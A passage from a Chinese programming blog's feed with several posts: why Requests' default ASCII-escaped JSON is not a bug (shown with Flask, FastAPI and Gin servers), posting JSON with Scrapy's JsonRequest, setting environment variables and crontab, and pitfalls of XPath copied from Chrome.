POST 发送数据的时候，默认是没有这个参数，而对<code>json.dumps</code>来说，省略这个参数等价于<code>ensure_ascii=True</code>：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-06-19-15-37-27.png" alt></p><p>所以实际上<code>Requests</code>在 POST 含有中文的数据时，会把中文转成 Unicode 码发给服务器，于是服务器根本就拿不到原始的中文信息了。所以就会导致报错。</p><p>但实际上，并不是这样的。我常常跟群里的同学说，做爬虫的同学，应该要有一些基本的后端常识，才不至于被这种现象误导。为了说明为什么上面这个同学的理解是错误的，为什么这不是 Requests 的 bug，我们自己来写一个含有 POST 的服务，来看看我们POST 两种情况的数据有没有区别。为了证明这个特性与网络框架无关，我这里分别使用Flask、Fastapi 、Gin 来进行演示。</p><p>首先，我们来看看Requests 测试代码。这里用3种方式发送了 JSON 格式的数据：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests </span><br><span class="line"><span class="keyword">import</span> json </span><br><span class="line"></span><br><span class="line">body = &#123;</span><br><span class="line">    <span class="string">'name'</span>: <span class="string">'青南'</span>,</span><br><span class="line">    <span class="string">'age'</span>: <span class="number">20</span></span><br><span class="line">&#125;</span><br><span class="line">url = <span class="string">'http://127.0.0.1:5000/test_json'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 直接使用 json=的方式发送</span></span><br><span class="line">resp = requests.post(url, json=body).json() </span><br><span class="line">print(resp)</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'Content-Type'</span>: <span class="string">'application/json'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提前把字典序列化成 JSON 字符串，中文转成 Unicode，跟第一种方式等价</span></span><br><span class="line">resp = requests.post(url,</span><br><span class="line">                     headers=headers,</span><br><span class="line">                     data=json.dumps(body)).json()</span><br><span class="line">print(resp)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提前把字典序列化成 JSON 字符串，中文保留</span></span><br><span class="line">resp = requests.post(url,</span><br><span class="line">                     headers=headers,</span><br><span class="line">                     data=json.dumps(body, ensure_ascii=<span class="literal">False</span>).encode()).json()</span><br><span class="line">print(resp)</span><br></pre></td></tr></table></figure><p>这段测试代码使用3种方式发送 POST 请求，其中，第一种方法就是 Requests 自带的<code>json=</code>参数，参数值是一个字典。Requests 会自动把它转成 JSON 字符串。后两种方式，是我们手动提前把字典转成 JSON 字符串，然后使用<code>data=</code>参数发送给服务器。这两种方式需要在 Headers 里面指明<code>&#39;Content-Type&#39;: &#39;application/json&#39;</code>，服务器才知道发上来的是 JSON 字符串。</p><p>我们再来看看 Flask 写的后端代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">'success'</span>: <span class="literal">True</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/test_json', methods=["POST"])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_json</span><span class="params">()</span>:</span></span><br><span class="line">    body = request.json </span><br><span class="line">    msg = <span class="string">f'收到 POST 数据，<span class="subst">&#123;body[<span class="string">"name"</span>]=&#125;</span>, <span class="subst">&#123;body[<span class="string">"age"</span>]=&#125;</span>'</span></span><br><span class="line">    print(msg)</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">'success'</span>: <span class="literal">True</span>, <span class="string">'msg'</span>: msg&#125;</span><br></pre></td></tr></table></figure><p>运行效果如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-06-19-15-51-17.png" alt></p><p>可以看到，无论使用哪种 POST 方式，后端都能接收到正确的信息。</p><p>我们再来看 Fastapi 版本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> FastAPI</span><br><span class="line"><span class="keyword">from</span> pydantic <span class="keyword">import</span> BaseModel </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Body</span><span class="params">(BaseModel)</span>:</span></span><br><span class="line">    name: str</span><br><span class="line">    age: int </span><br><span class="line"></span><br><span class="line">app = FastAPI()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">'success'</span>: <span class="literal">True</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.post('/test_json')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_json</span><span class="params">(body: Body)</span>:</span></span><br><span class="line">    msg = <span class="string">f'收到 POST 数据，<span class="subst">&#123;body.name=&#125;</span>, <span class="subst">&#123;body.age=&#125;</span>'</span></span><br><span class="line">    print(msg)</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">'success'</span>: <span class="literal">True</span>, <span class="string">'msg'</span>: msg&#125;</span><br></pre></td></tr></table></figure><p>运行效果如下图所示，三种 POST 发送的数据，都能被后端正确识别：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-06-19-15-53-52.png" alt></p><p>我们再来看看 Gin 版本的后端：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"fmt"</span></span><br><span class="line">    <span class="string">"net/http"</span></span><br><span class="line"></span><br><span class="line">    <span class="string">"github.com/gin-gonic/gin"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Body <span class="keyword">struct</span> &#123;</span><br><span class="line">    Name <span class="keyword">string</span> <span class="string">`json:"name"`</span></span><br><span class="line">    Age  <span class="keyword">int16</span>  <span class="string">`json:"age"`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    r := gin.Default()</span><br><span class="line">    r.GET(<span class="string">"/"</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">        c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line">            <span class="string">"message"</span>: <span class="string">"running"</span>,</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">    r.POST(<span class="string">"/test_json"</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">        json := Body&#123;&#125;</span><br><span class="line">        c.BindJSON(&amp;json)</span><br><span class="line">        msg := fmt.Sprintf(<span class="string">"收到 POST 数据，name=%s, age=%d"</span>, json.Name, json.Age)</span><br><span class="line">        fmt.Println(<span class="string">"&gt;&gt;&gt;"</span>, msg)</span><br><span class="line">        c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line">            <span class="string">"msg"</span>: fmt.Sprintf(<span class="string">"收到 POST 数据，name=%s, age=%d"</span>, json.Name, json.Age),</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">    r.Run()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行效果如下，三种请求方式的数据完全相同：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-06-19-15-56-23.png" alt></p><p>从这里可以知道，无论我们 POST 提交的 JSON 字符串中，中文是以 Unicode 码的形式存在还是直接以汉字的形式存在，后端服务都可以正确解析。</p><p>为什么我说中文在 JSON 字符串里面以哪种形式显示并不重要呢？这是因为，对 JSON 字符串来说，编程语言把它重新转换为对象的过程（叫做<code>反序列化</code>），本身就可以正确处理他们。我们来看下图：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-06-19-16-05-25.png" alt></p><p><code>ensure_ascii</code>参数的作用，仅仅控制的是 JSON 的显示样式，当<code>ensure_ascii</code>为<code>True</code>的时候，确保 JSON 字符串里面只有 ASCII 字符，所以不在 ASCII 128个字符内的字符，都会被转换。而当<code>ensure_ascii</code>为<code>False</code>的时候，这些非 ASCII 字符依然以原样显示。这就像是一个人化妆和不化妆一样，本质并不会改变。现代化的编程语言在对他们进行反序列化的时候，两种形式都能正确识别。</p><p>所以，如果你是用现代化的 Web 框架来写后端，那么这两种 JSON 形式应该是没有任何区别的。Request 默认的<code>json=</code>参数，相当于<code>ensure_ascii=True</code>，任何现代化的 Web 框架都能正确识别 POST 提交上来的内容。</p><p>当然，如果你使用的是 C 语言、汇编或者其他语言来裸写后端接口，那确实可能有所差别。可智商正常的人，谁会这样做？</p><p>综上所述，这位同学遇到的问题，并不是 Requests 的 bug，而是他的后端接口本身有问题。可能那个后端使用了某种弱智 Web 框架，它接收到的被 POST 发上来的信息，没有经过反序列化，就是一段 JSON 字符串，而那个后端程序员使用正则表达式从 JSON 字符串里面提取数据，所以当发现 JSON 字符串里面没有中文的时候，就报错了。</p><p>除了这个 POST 发送 JSON 的问题，以前我有个下属，在使用 Scrapy 发送 POST 信息的时候，由于不会写POST 的代码，突发奇想，把 POST 发送的字段拼接到 URL 上，然后用 GET 方式请求，发现也能获取数据，类似于：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">body = &#123;<span class="string">'name'</span>: <span class="string">'青南'</span>, <span class="string">'age'</span>: <span class="number">20</span>&#125;</span><br><span class="line">url = <span class="string">'http://www.xxx.com/api/yyy'</span></span><br><span class="line">requests.post(url, json=body).text</span><br><span class="line"></span><br><span class="line">requests.get(<span class="string">'http://www.xxx.com/api/yyy?name=青南&amp;age=20'</span>).text</span><br></pre></td></tr></table></figure><p>于是，这个同学得出一个结论，他认为这是一个普遍的规律，所有 POST 的请求都可以这样转到 GET 请求。</p><p>但显然，这个结论也是不正确的。这只能说明，这个网站的后端程序员，让这个接口能同时兼容两种提交数据的方式，这是需要后端程序员额外写代码来实现的。在默认情况下，GET 和 POST 是两种完全不同的请求方式，也不能这样转换。</p><p>如果这位同学会一些简单的后端，那么他立刻就可以写一个后端程序来验证自己的猜想。</p><p>再来一个例子，有一些网站，他们在 URL 中可能会包含另外一个 URL，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://kingname.info/get_info?url=https://abc.com/def/xyz?id=123&amp;db=admin</span><br></pre></td></tr></table></figure><p>如果你没有基本的后端知识，那么你可能看不出上面的网址有什么问题。但是如果你有一些基本的后端常识，那么你可能会问一个问题：网址中的<code>&amp;db=admin</code>，是属于<code>https://kingname.info/get_info</code>的一个参数，跟<code>url=</code>平级；还是属于<code>https://abc.com/def/xyz?id=123&amp;db=admin</code>的参数？你会疑惑，后端也会疑惑，所以这就是为什么我们这个时候需要 urlencode 的原因，毕竟下面两种写法，是完全不一样的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://kingname.info/get_info?url=https%3A%2F%2Fabc.com%2Fdef%2Fxyz%3Fid%3D123%26db%3Dadmin</span><br><span class="line"></span><br><span class="line">https://kingname.info/get_info?url=https%3A%2F%2Fabc.com%2Fdef%2Fxyz%3Fid%3D123&amp;db=admin</span><br></pre></td></tr></table></figure><p>最后，以我的爬虫书序言中的一句话来作为总结：</p><blockquote><p>爬虫是一门杂学，如果你只会爬虫，那么你是学不好爬虫的。</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今天在粉丝交流群里面，有个同学说他发现了&lt;code&gt;Requests&lt;/code&gt;的一个 bug，并修复了它：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-06-19-15-28-54.png&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;聊天记录中对应的图片为：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-06-19-15-29-19.png&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;看到这个同学的截图，我大概知道他遇到了什么问题，以及为什么会误认为这是 Requests 的 bug。&lt;/p&gt;
    
    </summary>
    
      <category term="编程思想" scheme="https://www.kingname.info/categories/%E7%BC%96%E7%A8%8B%E6%80%9D%E6%83%B3/"/>
    
    
      <category term="Python" scheme="https://www.kingname.info/tags/Python/"/>
    
      <category term="Golang" scheme="https://www.kingname.info/tags/Golang/"/>
    
      <category term="编程思想" scheme="https://www.kingname.info/tags/%E7%BC%96%E7%A8%8B%E6%80%9D%E6%83%B3/"/>
    
  </entry>
  
  <entry>
    <title>一日一技：Scrapy 如何正确 Post 发送 JSON 数据</title>
    <link href="https://www.kingname.info/2021/05/20/use-scrapy-jsonrequest/"/>
    <id>https://www.kingname.info/2021/05/20/use-scrapy-jsonrequest/</id>
    <published>2021-05-20T13:08:20.000Z</published>
    <updated>2021-05-20T13:11:20.004Z</updated>
    
    <content type="html"><![CDATA[<p>我们知道，HTTP请求的 POST 方式，提交上去的数据有很多种格式。例如<code>JSON</code>/<code>form-data</code>/<code>x-www-form-urlencoded</code>等等。我们在 Postman 的 POST 请求里面，可以看到这些数据格式，如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-05-20-20-31-18.png" alt></p><a id="more"></a><p>虽然同样都是 POST 方式，但是有些网站只能使用特定的格式才能正常返回数据。我们来看一个例子，现在向网址：<code>http://exercise.kingname.info/ajax_1_postbackend</code> POST 提交一个 JSON 字符串：<code>{“name”:”xx”,”age”:24}</code>可以正常得到返回：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-05-20-20-33-58.png" alt></p><p>但如果提交的数据格式不是 JSON，而是<code>form-data</code>，那么就会报错，如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-05-20-20-35-50.png" alt></p><p>这也就是为什么在使用 requests 的时候，post 方法的第二个参数有<code>data=</code>和<code>json=</code>的区别，如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-05-20-20-37-58.png" alt></p><p>在使用 Scrapy 的时候，很多人都知道怎么提交 GET 请求，但却不太清楚怎么提交 POST 请求。如果你在网上搜索，那么，你会看到有两种回答：</p><p>第一种回答，会建议你使用<code>scrapy.FormRequest</code>。但这个方法提交的数据是<code>form-data</code>格式，如果网站需要接收 JSON 格式的数据，那么提交就会失败。</p><p>第二种回答，会建议你使用<code>scrapy.Request(url, method=&#39;POST&#39;, body=json.dumps(xxx))</code>。这种方式确实可以成功提交 JSON 数据，但写起来比较麻烦。</p><p>但如果你看过 Scrapy 的官方文档<a href="https://doc.scrapy.org/en/latest/topics/request-response.html#jsonrequest" target="_blank" rel="noopener">Requests and Responses</a>，你就会知道，实际上 Scrapy 原本就提供了一个专门用来POST 提交 JSON 数据的方式——<code>JsonRequest</code>。它的位置在<code>scrapy.http.JsonRequest</code>。并且使用起来跟 <code>scrapy.Request</code>一样简单：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import scrapy</span><br><span class="line">from scrapy.http import JsonRequest</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class ExampleSpider(scrapy.Spider):</span><br><span class="line">    name = &apos;example&apos;</span><br><span class="line">    allowed_domains = [&apos;xxx.com&apos;]</span><br><span class="line">    # start_urls = [&apos;http://xxx.com/&apos;]</span><br><span class="line"></span><br><span class="line">    def start_requests(self):</span><br><span class="line">        body = &#123;</span><br><span class="line">            &apos;name&apos;: &apos;kingname&apos;,</span><br><span class="line">            &apos;age&apos;: 28</span><br><span class="line">        &#125;</span><br><span class="line">        url = &apos;http://exercise.kingname.info/ajax_1_postbackend&apos;</span><br><span class="line">        yield JsonRequest(url, data=body, callback=self.parse)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def parse(self, response, *args, **kwargs):</span><br><span class="line">        print(response.body.decode())</span><br></pre></td></tr></table></figure><p>运行效果如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-05-20-20-48-43.png" alt></p><p><code>JsonRequest</code>本来就是<code>scrapy.Request</code>的一个子类，所以所有能在<code>scrapy.Request</code>使用的参数，都可以直接在<code>JsonRequest</code>中使用。同时，它额外支持两个参数，分别是<code>data</code>和<code>dumps_kwargs</code>。其中<code>data</code>参数的值就是一个可以被<code>json.dumps</code>序列化的对象，例如字典或者列表。而<code>dumps_kwargs</code>里面的参数，就是 <code>json.dumps</code>支持的那些参数，例如<code>ensure_ascii=False</code>、<code>sort_keys=True</code>等等。</p><p>大家遇到问题多看官方文档，少在网上搜索些杂七杂八装逼货的烂博客。官方文档是你最好的朋友。</p><hr><p><strong>未闻 Code</strong> 技术交流群开放啦！群里既有国内一二线大厂在职员工，也有国内外高校在读学生，既有十多年码龄的编程老鸟，也有中小学刚刚入门的新人，学习氛围良好！想入群的同学，请添加我的微信“mekingname”，备注“粉丝群”（谢绝广告党，非诚勿扰！）~</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;我们知道，HTTP请求的 POST 方式，提交上去的数据有很多种格式。例如&lt;code&gt;JSON&lt;/code&gt;/&lt;code&gt;form-data&lt;/code&gt;/&lt;code&gt;x-www-form-urlencoded&lt;/code&gt;等等。我们在 Postman 的 POST 请求里面，可以看到这些数据格式，如下图所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-05-20-20-31-18.png&quot; alt&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="爬虫" scheme="https://www.kingname.info/categories/%E7%88%AC%E8%99%AB/"/>
    
    
      <category term="Python" scheme="https://www.kingname.info/tags/Python/"/>
    
      <category term="爬虫" scheme="https://www.kingname.info/tags/%E7%88%AC%E8%99%AB/"/>
    
      <category term="Scrapy" scheme="https://www.kingname.info/tags/Scrapy/"/>
    
  </entry>
  
  <entry>
    <title>一日一技：你真的知道如何设置环境变量？</title>
    <link href="https://www.kingname.info/2021/05/14/do-you-know-env/"/>
    <id>https://www.kingname.info/2021/05/14/do-you-know-env/</id>
    <published>2021-05-14T14:36:58.000Z</published>
    <updated>2021-05-14T14:37:40.147Z</updated>
    
    <content type="html"><![CDATA[<p>很多人都知道环境变量，很多人也在使用环境变量。但是很多人一说到在 Linux、macOS 中使用环境变量，第一个想到的就是<code>export XXX=yyy</code>这种形式的环境变量。但实际上，在 Linux 和 macOS 中，定义环境变量有三种方式，他们的效果和作用范围是不相同的。</p><a id="more"></a><p>以 macOS 为例，来说明这三种环境变量有什么不同。我们通过下面这个 Python 程序来验证设置结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">name = os.getenv(<span class="string">'WHO_AM_I'</span>, <span class="string">'找不到环境变量'</span>)</span><br><span class="line">print(<span class="string">'环境变量 WHO_AM_I 的值是：'</span>, name)</span><br></pre></td></tr></table></figure><h2 id="全局环境变量"><a href="#全局环境变量" class="headerlink" title="全局环境变量"></a>全局环境变量</h2><p>如果你使用 ZSH，那么你就会知道，ZSH 有一个配置文件<code>~/.zshrc</code>，打开以后，它的内容如下：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-03-04-20-19-58.png" alt></p><p>在这里添加一行代码：<code>export WHO_AM_I=kingname</code>，就能设置一个全局的环境变量。这个环境变量会始终生效。即使你现在把电脑关了再打开，或者任意新开一个终端窗口，这个环境变量始终是有效的。如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-03-04-20-23-27.png" alt></p><p>如果你电脑上没有 ZSH 的话，你也可以修改系统默认的<code>~/.bashrc</code>文件</p><h2 id="仅对当前窗口有效的环境变量"><a href="#仅对当前窗口有效的环境变量" class="headerlink" title="仅对当前窗口有效的环境变量"></a>仅对当前窗口有效的环境变量</h2><p>除了修改配置文件外，你也可以直接执行命令来设置环境变量，这也是最众所周知的方式。我们先把<code>~/.zshrc</code>里面的环境变量删了，来测试一下：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-03-04-20-27-26.png" alt></p><p>可以看到，当我们执行<code>export WHO_AM_I=kingname</code>时，这个环境变量只对<strong>当前终端窗口</strong>有用。你重新开一个新的终端窗口，或者关闭当前窗口再打开，它都会失效。</p><h2 id="仅对当前命令有效的环境变量"><a href="#仅对当前命令有效的环境变量" class="headerlink" title="仅对当前命令有效的环境变量"></a>仅对当前命令有效的环境变量</h2><p>除此之外，我们还可以设置让环境变量只对当前命令有效，就是把定义环境变量的代码直接放在执行的命令之前。并且不加 <code>export</code>。例如，我们要执行命令<code>python3 test.py</code>，那么我们就这样：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WHO_AM_I=kingname python3 test.py</span><br></pre></td></tr></table></figure><p>运行效果如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-03-04-20-30-36.png" alt></p><p>可以看到，只有在命令前面带上了定义语句的这一行才能正确获得环境变量。</p><p>这种方式特别在使用 Crontab 的时候有用。如果你经常使用 Crontab，那么你一定知道，Crontab 里面是不会认你的全局环境变量的。无论你是在<code>.zshrc</code>文件还是<code>.bashrc</code>中定义的环境变量，当你通过 Crontab 来执行的时候，程序都读不到环境变量。这个时候，就可以通过这种方式让程序运行的时候现场定义环境变量：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 12 * * * <span class="built_in">cd</span> /job/xxx &amp;&amp; WHO_AM_I=kingname python3 ./test.py</span><br></pre></td></tr></table></figure><p>这样一来，程序始终能够正确获得环境变量。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;很多人都知道环境变量，很多人也在使用环境变量。但是很多人一说到在 Linux、macOS 中使用环境变量，第一个想到的就是&lt;code&gt;export XXX=yyy&lt;/code&gt;这种形式的环境变量。但实际上，在 Linux 和 macOS 中，定义环境变量有三种方式，他们的效果和作用范围是不相同的。&lt;/p&gt;
    
    </summary>
    
      <category term="Linux" scheme="https://www.kingname.info/categories/Linux/"/>
    
    
      <category term="Python" scheme="https://www.kingname.info/tags/Python/"/>
    
      <category term="Linux" scheme="https://www.kingname.info/tags/Linux/"/>
    
      <category term="环境变量" scheme="https://www.kingname.info/tags/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/"/>
    
  </entry>
  
  <entry>
    <title>为什么不要轻易使用 Chrome 复制的 XPath？</title>
    <link href="https://www.kingname.info/2021/05/14/do-not-copy-xpath/"/>
    <id>https://www.kingname.info/2021/05/14/do-not-copy-xpath/</id>
    <published>2021-05-14T14:34:58.000Z</published>
    <updated>2021-05-14T14:36:01.077Z</updated>
    
    <content type="html"><![CDATA[<p>有一些同学在写爬虫的时候，喜欢在Chrome 开发者工具里面直接复制 XPath，如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-03-03-19-46-58.png" alt></p><p>他们觉得这样复制出来的 XPath 虽然长了点，但是工作一切正常，所以频繁使用。</p><p>但我希望大家不要过于依赖这个功能。因为它给出的结果仅作参考，有时候并不能让你提取出数据。我们来看一个例子。</p><a id="more"></a><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-03-03-19-55-52.png" alt></p><p>这是一个非常简单的HTML 页面，页面中有一个表格，表格有一列叫做<code>电话</code>。我现在想把这里面的5个电话提取出来。如果直接使用 Chrome 的复制 XPath 的功能，我们可以得到下面这个 XPath：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/html/body/div/table/tbody/tr[<span class="number">3</span>]/td[<span class="number">4</span>]</span><br></pre></td></tr></table></figure><p>这实际上对应了<code>刘小三</code>这一行的电话字段。那么，我们去掉<code>tr</code>后面的数字，似乎就能覆盖到所有行了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/html/body/div/table/tbody/tr/td[<span class="number">4</span>]/text()</span><br></pre></td></tr></table></figure><p>在 XPath Helper 上面运行看看效果，确实提取出了所有的电话号码，如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-03-03-19-56-16.png" alt></p><p>但如果你使用 requests 来爬这个网页，然后使用 XPath 提取电话号码，你就会发现什么都提取不到，如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-03-03-20-01-42.png" alt></p><p>你可能会想，这应该是异步加载导致的问题。表格里面的数据是通过 Ajax 后台加载的，不在网页源代码里面。</p><p>那么我们打印看看网页的源代码：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-03-03-20-02-47.png" alt></p><p>大家可以看到，数据就在网页源代码里面，那为什么我们在Chrome 上面通过 XPath  Helper 就能提取数据，而用 requests 就无法提取数据？</p><p>实际上，如果大家仔细观察从 Chrome 中复制出来的 XPath，就会发现它里面有一个<code>tbody</code>节点。但是我们的网页源代码是没有这个节点的。</p><p>这就要说到 Chrome 开发者工具里面显示的 HTML 代码，跟网页真正的源代码之间的区别了。很多人分不清楚这两者的区别，所以导致写出的 XPath 匹配不到数据。</p><p>当我们说到<code>网页源代码</code>的时候，我们指的是在网页上右键，选择“显示网页源代码”按钮所查看到的 HTML 代码，如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-03-03-20-07-17.png" alt></p><p>这个查看源代码的页面长成下图所示的这样：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-03-03-20-08-33.png" alt></p><p>注意地址栏，是以<code>view-source:</code>开头的。这才是网页真真正正的源代码。</p><p>而Chrome 的开发者工具里面的<code>Element</code>标签所显示的源代码，长成下面这样：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-03-03-20-09-48.png" alt></p><p>这两个地方的HTML代码<strong>可能是</strong>不一样的，而且在现代化的网站中，这两个地方的 HTML<strong>大概率是不一样的</strong>。当我们使用 requests 或者 Scrapy 时，拿到的是第一种情况的源代码，这才是网页真正的源代码。而在开发者工具里面的 HTML 代码，是经过 Chrome 